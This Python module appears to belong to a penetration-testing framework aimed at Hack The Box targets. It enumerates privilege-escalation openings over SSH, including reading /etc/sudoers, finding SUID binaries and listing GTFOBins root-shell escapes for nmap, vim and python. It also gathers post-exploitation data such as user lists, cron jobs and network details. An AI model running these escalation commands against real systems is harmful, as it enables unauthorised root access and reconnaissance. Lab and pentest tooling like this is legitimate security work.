#!/usr/bin/env python3
import subprocess
import os
import json
import logging
import shutil
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
from ..utils.htb_utils import HTBUtils

class EvasionLevel(Enum):
    EVASIVE = "evasive"
    HYBRID = "hybrid"
    NON_EVASIVE = "non_evasive"

@dataclass
class SensitiveData:
    type: str  # e.g., "PCI", "HIPAA", "GLBA", "FISMA"
    location: str
    description: str
    size: int
    timestamp: str
    framework: str  # e.g., "NIST", "CIS", "ISO", "PCI-DSS"

class PrivilegeEscalation:
    def __init__(self, target, logger, tool_manager):
        self.target = target
        self.logger = logger
        self.tool_manager = tool_manager
        self.gtfobins_db = self._load_gtfobins_database()
        
    def check_sudo_permissions(self):
        """Check for sudo permissions and misconfigurations"""
        try:
            # Check sudo -l
            sudo_command = f"ssh user@{self.target} 'sudo -l'"
            result = self.tool_manager.run_tool("ssh", sudo_command)
            
            # Check sudoers file
            sudoers_command = f"ssh user@{self.target} 'cat /etc/sudoers'"
            sudoers_result = self.tool_manager.run_tool("ssh", sudoers_command)
            
            return self._analyze_sudo_permissions(result, sudoers_result)
        except Exception as e:
            self.logger.error(f"Failed to check sudo permissions: {str(e)}")
            return {"error": str(e)}
            
    def check_suid_binaries(self):
        """Check for SUID binaries and potential exploits"""
        try:
            # Find SUID binaries
            find_command = f"ssh user@{self.target} 'find / -perm -4000 -ls 2>/dev/null'"
            result = self.tool_manager.run_tool("ssh", find_command)
            
            # Check for GTFOBins matches
            return self._analyze_suid_binaries(result)
        except Exception as e:
            self.logger.error(f"Failed to check SUID binaries: {str(e)}")
            return {"error": str(e)}
            
    def check_cron_jobs(self):
        """Check for exploitable cron jobs"""
        try:
            # Check system cron jobs
            system_cron_command = f"ssh user@{self.target} 'ls -la /etc/cron*'"
            system_cron_result = self.tool_manager.run_tool("ssh", system_cron_command)
            
            # Check user cron jobs
            user_cron_command = f"ssh user@{self.target} 'ls -la /var/spool/cron/crontabs/'"
            user_cron_result = self.tool_manager.run_tool("ssh", user_cron_command)
            
            return self._analyze_cron_jobs(system_cron_result, user_cron_result)
        except Exception as e:
            self.logger.error(f"Failed to check cron jobs: {str(e)}")
            return {"error": str(e)}
            
    def check_capabilities(self):
        """Check for Linux capabilities"""
        try:
            # Check system capabilities
            cap_command = f"ssh user@{self.target} 'getcap -r / 2>/dev/null'"
            result = self.tool_manager.run_tool("ssh", cap_command)
            
            return self._analyze_capabilities(result)
        except Exception as e:
            self.logger.error(f"Failed to check capabilities: {str(e)}")
            return {"error": str(e)}
            
    def check_writable_files(self):
        """Check for writable files and directories"""
        try:
            # Check system directories
            system_command = f"ssh user@{self.target} 'find / -writable -type d 2>/dev/null'"
            system_result = self.tool_manager.run_tool("ssh", system_command)
            
            # Check user directories
            user_command = f"ssh user@{self.target} 'find ~ -writable -type d 2>/dev/null'"
            user_result = self.tool_manager.run_tool("ssh", user_command)
            
            return self._analyze_writable_files(system_result, user_result)
        except Exception as e:
            self.logger.error(f"Failed to check writable files: {str(e)}")
            return {"error": str(e)}
            
    def check_environment_variables(self):
        """Check for sensitive environment variables"""
        try:
            # Check environment variables
            env_command = f"ssh user@{self.target} 'env'"
            result = self.tool_manager.run_tool("ssh", env_command)
            
            return self._analyze_environment_variables(result)
        except Exception as e:
            self.logger.error(f"Failed to check environment variables: {str(e)}")
            return {"error": str(e)}
            
    def check_mounted_filesystems(self):
        """Check for interesting mounted filesystems"""
        try:
            # Check mounted filesystems
            mount_command = f"ssh user@{self.target} 'mount'"
            result = self.tool_manager.run_tool("ssh", mount_command)
            
            return self._analyze_mounted_filesystems(result)
        except Exception as e:
            self.logger.error(f"Failed to check mounted filesystems: {str(e)}")
            return {"error": str(e)}
            
    def check_running_processes(self):
        """Check for interesting running processes"""
        try:
            # Check running processes
            ps_command = f"ssh user@{self.target} 'ps aux'"
            result = self.tool_manager.run_tool("ssh", ps_command)
            
            return self._analyze_running_processes(result)
        except Exception as e:
            self.logger.error(f"Failed to check running processes: {str(e)}")
            return {"error": str(e)}
            
    def check_network_connections(self):
        """Check for interesting network connections"""
        try:
            # Check network connections
            netstat_command = f"ssh user@{self.target} 'netstat -tuln'"
            result = self.tool_manager.run_tool("ssh", netstat_command)
            
            return self._analyze_network_connections(result)
        except Exception as e:
            self.logger.error(f"Failed to check network connections: {str(e)}")
            return {"error": str(e)}
            
    def _load_gtfobins_database(self):
        """Load GTFOBins database"""
        # This would typically load from a JSON file
        return {
            "nmap": {
                "suid": "nmap --interactive",
                "sudo": "sudo nmap --interactive"
            },
            "vim": {
                "suid": "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
                "sudo": "sudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
            },
            "python": {
                "suid": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
                "sudo": "sudo python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
            }
        }
        
    def _analyze_sudo_permissions(self, sudo_output, sudoers_output):
        """Analyze sudo permissions and misconfigurations"""
        vulnerabilities = []
        
        # Check sudo -l output
        for line in sudo_output.split('\n'):
            if '(ALL)' in line or '(ALL:ALL)' in line:
                vulnerabilities.append({
                    "type": "sudo_all",
                    "details": line.strip()
                })
            elif 'NOPASSWD' in line:
                vulnerabilities.append({
                    "type": "sudo_nopasswd",
                    "details": line.strip()
                })
                
        # Check sudoers file
        for line in sudoers_output.split('\n'):
            if 'ALL=' in line and 'NOPASSWD' in line:
                vulnerabilities.append({
                    "type": "sudoers_nopasswd",
                    "details": line.strip()
                })
                
        return vulnerabilities
        
    def _analyze_suid_binaries(self, find_output):
        """Analyze SUID binaries and check for GTFOBins matches"""
        vulnerabilities = []
        
        for line in find_output.split('\n'):
            if not line.strip():
                continue
                
            parts = line.split()
            if len(parts) >= 11:
                binary = parts[10]
                binary_name = os.path.basename(binary)
                
                if binary_name in self.gtfobins_db:
                    vulnerabilities.append({
                        "type": "suid_gtfobins",
                        "binary": binary,
                        "exploit": self.gtfobins_db[binary_name]["suid"]
                    })
                    
        return vulnerabilities
        
    def _analyze_cron_jobs(self, system_cron_output, user_cron_output):
        """Analyze cron jobs for vulnerabilities"""
        vulnerabilities = []
        
        # Check system cron jobs
        for line in system_cron_output.split('\n'):
            if not line.strip():
                continue
                
            if 'writable' in line or '777' in line:
                vulnerabilities.append({
                    "type": "cron_writable",
                    "details": line.strip()
                })
                
        # Check user cron jobs
        for line in user_cron_output.split('\n'):
            if not line.strip():
                continue
                
            if 'writable' in line or '777' in line:
                vulnerabilities.append({
                    "type": "cron_user_writable",
                    "details": line.strip()
                })
                
        return vulnerabilities
        
    def _analyze_capabilities(self, cap_output):
        """Analyze Linux capabilities"""
        vulnerabilities = []
        
        for line in cap_output.split('\n'):
            if not line.strip():
                continue
                
            if 'cap_dac_override' in line or 'cap_dac_read_search' in line:
                vulnerabilities.append({
                    "type": "capability_dac",
                    "details": line.strip()
                })
            elif 'cap_sys_admin' in line:
                vulnerabilities.append({
                    "type": "capability_sys_admin",
                    "details": line.strip()
                })
                
        return vulnerabilities
        
    def _analyze_writable_files(self, system_output, user_output):
        """Analyze writable files and directories"""
        vulnerabilities = []
        
        # Check system directories
        for line in system_output.split('\n'):
            if not line.strip():
                continue
                
            if '/etc/' in line or '/usr/' in line:
                vulnerabilities.append({
                    "type": "writable_system",
                    "path": line.strip()
                })
                
        # Check user directories
        for line in user_output.split('\n'):
            if not line.strip():
                continue
                
            if '.ssh/' in line or '.config/' in line:
                vulnerabilities.append({
                    "type": "writable_user",
                    "path": line.strip()
                })
                
        return vulnerabilities
        
    def _analyze_environment_variables(self, env_output):
        """Analyze environment variables"""
        vulnerabilities = []
        sensitive_vars = ['PATH', 'LD_PRELOAD', 'LD_LIBRARY_PATH', 'PYTHONPATH']
        
        for line in env_output.split('\n'):
            if not line.strip():
                continue
                
            for var in sensitive_vars:
                if line.startswith(var + '='):
                    vulnerabilities.append({
                        "type": "env_variable",
                        "variable": var,
                        "value": line.split('=', 1)[1]
                    })
                    
        return vulnerabilities
        
    def _analyze_mounted_filesystems(self, mount_output):
        """Analyze mounted filesystems"""
        vulnerabilities = []
        
        for line in mount_output.split('\n'):
            if not line.strip():
                continue
                
            if 'noexec' not in line and 'nosuid' not in line:
                vulnerabilities.append({
                    "type": "mount_permissive",
                    "details": line.strip()
                })
                
        return vulnerabilities
        
    def _analyze_running_processes(self, ps_output):
        """Analyze running processes"""
        vulnerabilities = []
        interesting_processes = ['mysql', 'postgres', 'redis', 'mongodb']
        
        for line in ps_output.split('\n'):
            if not line.strip():
                continue
                
            for process in interesting_processes:
                if process in line.lower():
                    vulnerabilities.append({
                        "type": "interesting_process",
                        "process": process,
                        "details": line.strip()
                    })
                    
        return vulnerabilities
        
    def _analyze_network_connections(self, netstat_output):
        """Analyze network connections"""
        vulnerabilities = []
        interesting_ports = [21, 22, 23, 25, 3306, 5432, 6379, 27017]
        
        for line in netstat_output.split('\n'):
            if not line.strip():
                continue
                
            for port in interesting_ports:
                if f":{port}" in line:
                    vulnerabilities.append({
                        "type": "interesting_port",
                        "port": port,
                        "details": line.strip()
                    })
                    
        return vulnerabilities

class PostExploitation:
    def __init__(self, target, logger, os_type, credentials=None):
        self.target = target
        self.logger = logger
        self.os_type = os_type.lower()
        self.credentials = credentials or {}
        self.htb_utils = HTBUtils(logger)
        self.output_dir = f"reports/post_exploitation_{self.os_type}"
        
        # Create output directory if it doesn't exist
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
            
    def run(self):
        """Main method to run post-exploitation activities"""
        self.logger.info(f"Starting post-exploitation for {self.target}")
        
        try:
            if self.os_type == 'windows':
                return self._post_exploit_windows()
            elif self.os_type == 'linux':
                return self._post_exploit_linux()
            else:
                self.logger.error(f"Unsupported OS type: {self.os_type}")
                return {}
                
        except Exception as e:
            self.logger.error(f"Error during post-exploitation: {str(e)}")
            return {}
            
    def _post_exploit_windows(self):
        """Post-exploitation for Windows targets"""
        findings = {
            'system_info': self._get_windows_system_info(),
            'user_accounts': self._get_windows_users(),
            'network_info': self._get_windows_network_info(),
            'running_processes': self._get_windows_processes(),
            'installed_software': self._get_windows_software(),
            'scheduled_tasks': self._get_windows_tasks()
        }
        
        self._save_findings(findings, 'windows')
        return findings
        
    def _post_exploit_linux(self):
        """Post-exploitation for Linux targets"""
        findings = {
            'system_info': self._get_linux_system_info(),
            'user_accounts': self._get_linux_users(),
            'network_info': self._get_linux_network_info(),
            'running_processes': self._get_linux_processes(),
            'installed_packages': self._get_linux_packages(),
            'cron_jobs': self._get_linux_cron()
        }
        
        self._save_findings(findings, 'linux')
        return findings
        
    def _get_windows_system_info(self):
        """Get Windows system information"""
        findings = {}
        
        try:
            # Get system info
            cmd = "systeminfo"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['system_info'] = result.stdout
                
            # Get OS version
            cmd = "ver"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['os_version'] = result.stdout
        except Exception as e:
            self.logger.error(f"Error getting Windows system info: {str(e)}")
            
        return findings
        
    def _get_windows_users(self):
        """Get Windows user accounts"""
        findings = {}
        
        try:
            # Get local users
            cmd = "net user"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['local_users'] = result.stdout
                
            # Get domain users if available
            cmd = "net user /domain"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['domain_users'] = result.stdout
        except Exception as e:
            self.logger.error(f"Error getting Windows users: {str(e)}")
            
        return findings
        
    def _get_windows_network_info(self):
        """Get Windows network information"""
        findings = {}
        
        try:
            # Get network configuration
            cmd = "ipconfig /all"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['network_config'] = result.stdout
                
            # Get active connections
            cmd = "netstat -ano"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['active_connections'] = result.stdout
        except Exception as e:
            self.logger.error(f"Error getting Windows network info: {str(e)}")
            
        return findings
        
    def _get_windows_processes(self):
        """Get Windows running processes"""
        findings = {}
        
        try:
            # Get running processes
            cmd = "tasklist /v"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['running_processes'] = result.stdout
                
            # Get services
            cmd = "net start"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['services'] = result.stdout
        except Exception as e:
            self.logger.error(f"Error getting Windows processes: {str(e)}")
            
        return findings
        
    def _get_windows_software(self):
        """Get Windows installed software"""
        findings = {}
        
        try:
            # Get installed software
            cmd = "wmic product get name,version"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['installed_software'] = result.stdout
        except Exception as e:
            self.logger.error(f"Error getting Windows software: {str(e)}")
            
        return findings
        
    def _get_windows_tasks(self):
        """Get Windows scheduled tasks"""
        findings = {}
        
        try:
            # Get scheduled tasks
            cmd = "schtasks /query /fo LIST /v"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['scheduled_tasks'] = result.stdout
        except Exception as e:
            self.logger.error(f"Error getting Windows tasks: {str(e)}")
            
        return findings
        
    def _get_linux_system_info(self):
        """Get Linux system information"""
        findings = {}
        
        try:
            # Get system info
            cmd = "uname -a"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['system_info'] = result.stdout
                
            # Get OS version
            cmd = "cat /etc/os-release"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['os_version'] = result.stdout
        except Exception as e:
            self.logger.error(f"Error getting Linux system info: {str(e)}")
            
        return findings
        
    def _get_linux_users(self):
        """Get Linux user accounts"""
        findings = {}
        
        try:
            # Get user accounts
            cmd = "cat /etc/passwd"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['user_accounts'] = result.stdout
                
            # Get groups
            cmd = "cat /etc/group"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['groups'] = result.stdout
        except Exception as e:
            self.logger.error(f"Error getting Linux users: {str(e)}")
            
        return findings
        
    def _get_linux_network_info(self):
        """Get Linux network information"""
        findings = {}
        
        try:
            # Get network configuration
            cmd = "ifconfig -a"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['network_config'] = result.stdout
                
            # Get routing table
            cmd = "netstat -rn"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['routing_table'] = result.stdout
        except Exception as e:
            self.logger.error(f"Error getting Linux network info: {str(e)}")
            
        return findings
        
    def _get_linux_processes(self):
        """Get Linux running processes"""
        findings = {}
        
        try:
            # Get running processes
            cmd = "ps aux"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['running_processes'] = result.stdout
                
            # Get services
            cmd = "systemctl list-units --type=service"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['services'] = result.stdout
        except Exception as e:
            self.logger.error(f"Error getting Linux processes: {str(e)}")
            
        return findings
        
    def _get_linux_packages(self):
        """Get Linux installed packages"""
        findings = {}
        
        try:
            # Try different package managers
            package_managers = {
                'dpkg': 'dpkg -l',
                'rpm': 'rpm -qa',
                'pacman': 'pacman -Q',
                'apk': 'apk info'
            }
            
            for manager, cmd in package_managers.items():
                result = subprocess.run(cmd.split(), capture_output=True, text=True)
                if result.returncode == 0:
                    findings[f'{manager}_packages'] = result.stdout
                    break
        except Exception as e:
            self.logger.error(f"Error getting Linux packages: {str(e)}")
            
        return findings
        
    def _get_linux_cron(self):
        """Get Linux cron jobs"""
        findings = {}
        
        try:
            # Get system cron jobs
            cmd = "ls -la /etc/cron*"
            result = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['system_cron'] = result.stdout
                
            # Get user cron jobs
            cmd = "for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l 2>/dev/null; done"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                findings['user_cron'] = result.stdout
        except Exception as e:
            self.logger.error(f"Error getting Linux cron jobs: {str(e)}")
            
        return findings
        
    def _save_findings(self, findings, os_type):
        """Save post-exploitation findings to file"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"{self.output_dir}/{os_type}_{self.target}_{timestamp}.json"
            
            with open(output_file, 'w') as f:
                json.dump(findings, f, indent=4)
                
            self.logger.info(f"Post-exploitation findings saved to {output_file}")
        except Exception as e:
            self.logger.error(f"Error saving findings: {str(e)}") 